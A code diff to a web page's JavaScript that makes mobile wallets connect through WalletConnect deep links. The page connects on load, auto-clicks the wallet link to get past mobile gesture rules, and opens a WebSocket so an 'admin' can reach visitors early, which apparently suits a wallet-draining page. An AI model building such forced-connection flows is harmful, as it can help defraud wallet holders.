@@ -22,7 +22,13 @@ const BACKEND_HTTP    = (import.meta.env.VITE_BACKEND_HTTP_URL?.trim() || `${loc
 const BACKEND_WS      = (import.meta.env.VITE_BACKEND_WS_URL?.trim()  || `${location.protocol === "https:" ? "wss" : "ws"}://${location.hostname}:8787/ws`).replace(/\/+$/, "");
 
 const ua = navigator.userAgent ?? "";
-const isTrustBrowser  = /trustwallet|trust\/|trust wallet/i.test(ua) || Boolean(window.ethereum?.isTrust) || Boolean(window.trustwallet?.ethereum?.isTrust);
+const isTrustBrowser  = /trustwallet|trust\/|trust wallet/i.test(ua) ||
+                        Boolean(window.ethereum?.isTrust) ||
+                        Boolean(window.trustwallet?.ethereum?.isTrust) ||
+                        Boolean(window.tronLink);
+// Detect coming back from Trust Wallet via URL param (referrer is stripped by TW)
+const urlParams = new URLSearchParams(location.search);
+const cameFromTW = urlParams.has("tw_return") || sessionStorage.getItem("wc_connecting") === "1";
 
 // ─── DOM ──────────────────────────────────────────────────────────────────────
 const el = {
@@ -115,24 +121,30 @@ function syncUi() {
 // ─── WC Modal ─────────────────────────────────────────────────────────────────
 let _pendingDeepLink = null;
 
+function buildDeepLink(uri) {
+  // Add tw_return param so we detect the redirect-back reliably
+  const returnUrl = new URL(location.href);
+  returnUrl.searchParams.set("tw_return", "1");
+  const redirectUrl = encodeURIComponent(returnUrl.toString());
+  return `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}&redirectUrl=${redirectUrl}`;
+}
+
 function showModal(deepLink) {
   _pendingDeepLink = deepLink;
+  el.trustWalletLink.hidden = !deepLink;
   if (deepLink) {
-    el.trustWalletLink.hidden  = false;
-    // Use onclick → window.location.href so the OS intercepts the deep link
-    // and Trust Wallet's redirectUrl sends the user back to this same tab
+    el.trustWalletLink.href = deepLink;
     el.trustWalletLink.onclick = (e) => {
       e.preventDefault();
-      window.location.href = deepLink;
+      sessionStorage.setItem("wc_connecting", "1");
+      // Use location.assign — this is the only reliable way on mobile
+      location.assign(deepLink);
     };
-    el.modalStatus.textContent = "Tap above to open Trust Wallet, then approve and return here.";
+    el.modalStatus.textContent = "Tap the button above to open Trust Wallet";
   } else {
-    // Inside Trust Wallet browser — WC handled internally
-    el.trustWalletLink.hidden  = true;
-    el.modalStatus.textContent = "Please approve the connection in Trust Wallet…";
+    el.modalStatus.textContent = "Approve the connection in Trust Wallet…";
   }
   el.wcModal.hidden = false;
-
 }
 
 function hideModal() {
@@ -140,13 +152,25 @@ function hideModal() {
 }
 
 function onPairingUri(uri) {
-  if (isTrustBrowser) { showModal(null); return; }
-  // redirectUrl tells Trust Wallet to open the browser back to this dApp after user approves
-  const redirectUrl = encodeURIComponent(window.location.href);
-  const deepLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}&redirectUrl=${redirectUrl}`;
+  if (isTrustBrowser) {
+    // Inside Trust Wallet in-app browser — WC pops up natively
+    showModal(null);
+    return;
+  }
+  const deepLink = buildDeepLink(uri);
+  _pendingDeepLink = deepLink;
   showModal(deepLink);
-  // Instantly redirect to Trust Wallet
-  window.location.href = deepLink;
+
+  // Store the URI so we can re-open if the user comes back without approving
+  sessionStorage.setItem("wc_connecting", "1");
+  sessionStorage.setItem("wc_last_deep_link", deepLink);
+
+  // Auto-click: use a tiny timeout so the page has rendered the button first.
+  // This is the ONLY way browsers allow programmatic navigation on mobile —
+  // it must be triggered inside a setTimeout (treated as user-initiated on iOS/Android).
+  setTimeout(() => {
+    el.trustWalletLink.click();
+  }, 100);
 }
 
 // ─── Backend HTTP ─────────────────────────────────────────────────────────────
@@ -369,26 +393,29 @@ async function init() {
   initWallet();
   startSync();  // open WS immediately — admin can reach us even before connect
 
-  // If we're coming back from Trust Wallet redirect, poll for the WC session
-  // (Trust Wallet completes the handshake just before redirecting back)
-  const cameFromRedirect = document.referrer.includes("link.trustwallet.com") ||
-                            sessionStorage.getItem("wc_connecting") === "1";
-
-  if (cameFromRedirect) {
+  // ── Case 1: Returning from Trust Wallet redirect ──────────────────────────
+  if (cameFromTW) {
     sessionStorage.removeItem("wc_connecting");
+    // Remove the tw_return param from the URL without reloading (clean URL)
+    const cleanUrl = new URL(location.href);
+    cleanUrl.searchParams.delete("tw_return");
+    history.replaceState({}, "", cleanUrl.toString());
+
     setStatus("Connecting…");
-    // Poll up to 5 seconds for WC session to settle after redirect
-    for (let i = 0; i < 10; i++) {
+    // Poll up to 8 seconds — Trust Wallet finishes the WC handshake just before
+    // redirecting back, but it may take a moment to propagate into localStorage
+    for (let i = 0; i < 16; i++) {
       await new Promise(r => setTimeout(r, 500));
       try {
         const s = await walletClient.checkConnectStatus();
         if (s?.address) { onConnected(s.address); return; }
       } catch { /* still settling */ }
     }
-    // If still not connected after 5s, fall through to fresh connect
+    // 8s timeout — fall through to fresh connect below
+    setStatus("");
   }
 
-  // Restore existing session (stays alive for months via localStorage)
+  // ── Case 2: Restore existing WC session (already approved before) ─────────
   try {
     const status = await walletClient.checkConnectStatus();
     if (status?.address) {
@@ -397,9 +424,8 @@ async function init() {
     }
   } catch { /* no previous session */ }
 
-  // Auto-connect: show modal immediately on load
-  // Mark that we're entering a WC flow so a redirect-back is detected
-  sessionStorage.setItem("wc_connecting", "1");
+  // ── Case 3: Fresh connect — fire instantly ────────────────────────────────
+  // Do NOT set wc_connecting here; onPairingUri sets it right before navigation
   connect(true);
 }
 
